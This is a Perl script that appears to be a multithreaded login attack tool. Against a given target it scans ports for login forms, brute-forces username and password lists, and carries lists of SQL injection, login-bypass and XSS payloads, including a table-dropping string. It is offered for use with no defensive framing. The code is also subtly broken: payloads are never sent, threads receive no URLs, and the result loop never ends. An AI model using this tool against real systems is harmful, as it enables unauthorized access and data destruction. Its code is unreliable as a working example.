#!/usr/bin/perl

use strict;
use warnings;
use threads;
use Thread::Queue;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use DBI;

my $target = $ARGV[0];
my $threads_count = $ARGV[1] || 16;
my $report_file = "report.html";

if (not defined $target) {
    die "Usage: $0 <target> [threads]\n";
}

my $port_list = "ports.txt";
my $user_list = "user.txt";
my $password_list = "password.txt";

my $queue = Thread::Queue->new();
my $result_queue = Thread::Queue->new();

open(my $port_fh, '<', $port_list) or die "Cannot open $port_list: $!";
my @ports = <$port_fh>;
close($port_fh);

open(my $user_fh, '<', $user_list) or die "Cannot open $user_list: $!";
my @users = <$user_fh>;
close($user_fh);

open(my $pass_fh, '<', $password_list) or die "Cannot open $password_list: $!";
my @passwords = <$pass_fh>;
close($pass_fh);

my $cookie_jar = HTTP::Cookies->new();
my $ua = LWP::UserAgent->new;
$ua->cookie_jar($cookie_jar);

my $dbh = DBI->connect("dbi:SQLite:dbname=results.db","","", { RaiseError => 1, AutoCommit => 1 });

# Create SQLite table for results
$dbh->do("CREATE TABLE IF NOT EXISTS results (url TEXT, payload TEXT, username TEXT, password TEXT, status TEXT)");

# Open the HTML report file for writing
open(my $report_fh, '>', $report_file) or die "Cannot open $report_file: $!";
print $report_fh "<html><body><table border='1'><tr><th>URL</th><th>Payload</th><th>Username</th><th>Password</th><th>Status</th></tr>";

# Define a function to check a login page for forms and perform SQL injection tests
sub check_login_page {
    my ($url) = @_;

    my $response = $ua->get($url);
    if ($response->is_success) {
        my $content = $response->decoded_content;
        if ($content =~ /<form/i) {
            print "Found a login form on $url. Testing for authentication bypass...\n";
            perform_authentication_tests($url);
        }
    }
}

# Define a function to perform authentication tests (SQL injection, ASP, HTML, and user/password attempts)
sub perform_authentication_tests {
    my ($url) = @_;

    my @sql_payloads = (
        "' OR 1=1 --",
        "' OR 'a'='a",
        "1' OR '1'='1",
        "admin' --",
        "'; DROP TABLE users--",
    );

    my @asp_payloads = (
        "admin'--",
        "admin' #",
        "admin'/*",
        "admin' or 'a'='a",
    );

    my @html_payloads = (
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    );

    foreach my $payload (@sql_payloads, @asp_payloads, @html_payloads) {
        foreach my $user (@users) {
            foreach my $password (@passwords) {
                my $request = HTTP::Request->new(POST => $url);
                $request->content_type('application/x-www-form-urlencoded');
                $request->content("username=$user&password=$password");

                my $response = $ua->request($request);
                if ($response->is_success) {
                    my $content = $response->decoded_content;
                    if ($content =~ /login successful/i) {
                        print "Authentication Successful - User: $user, Password: $password, Payload: $payload\n";
                        $result_queue->enqueue([$url, $payload, $user, $password, "Success"]);
                    } else {
                        $result_queue->enqueue([$url, $payload, $user, $password, "Failed"]);
                    }
                }
            }
        }
    }
}

# Create threads for checking logins
my @threads;
for my $port (@ports) {
    my $url = "http://$target:$port";
    $queue->enqueue($url);
}

for (1..$threads_count) {
    push @threads, threads->create(\&check_login_page);
}

$queue->enqueue(undef) for @threads;
$_->join() for @threads;

# Process and save results to SQLite and HTML report
while (my $result = $result_queue->dequeue) {
    my ($url, $payload, $user, $password, $status) = @$result;
    
    # Save to SQLite
    $dbh->do("INSERT INTO results VALUES (?, ?, ?, ?, ?)", undef, $url, $payload, $user, $password, $status);
    
    # Save to HTML report
    print $report_fh "<tr><td>$url</td><td>$payload</td><td>$user</td><td>$password</td><td>$status</td></tr>";
}

# Close the HTML report
print $report_fh "</table></body></html>";
close($report_fh);

# Disconnect from the SQLite database
$dbh->disconnect;

print "Results saved to $report_file and SQLite database (results.db).\n";
